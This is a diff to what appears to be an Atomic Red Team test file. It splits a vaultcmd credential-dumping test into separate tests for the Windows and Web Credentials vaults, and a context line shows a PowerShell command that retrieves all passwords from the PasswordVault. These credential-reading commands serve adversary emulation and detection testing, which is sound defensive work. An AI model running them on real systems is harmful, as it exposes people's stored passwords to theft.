@@ -50,8 +50,8 @@ atomic_tests:
     command: |
       [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]$vault = new-object Windows.Security.Credentials.PasswordVault -ErrorAction silentlycontinue
       $vault.RetrieveAll() | % { $_.RetrievePassword();$_ }
-- name: Dump credentials from Windows Credential Manager using vaultcmd.exe
-  description: This module will extract credentials stored in both vaults of Windows Credential Manager using builtin utility vaultcmd.exe
+- name: Dump credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials]
+  description: This module will extract credentials stored in Windows Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe
   supported_platforms:
   - windows
   executor:
@@ -59,3 +59,12 @@ atomic_tests:
     elevation_required: false
     command: |
       vaultcmd /listcreds:"Windows Credentials" /all
+- name: Dump credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]
+  description: This module will extract credentials stored in Web Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      vaultcmd /listcreds:"Web Credentials" /all
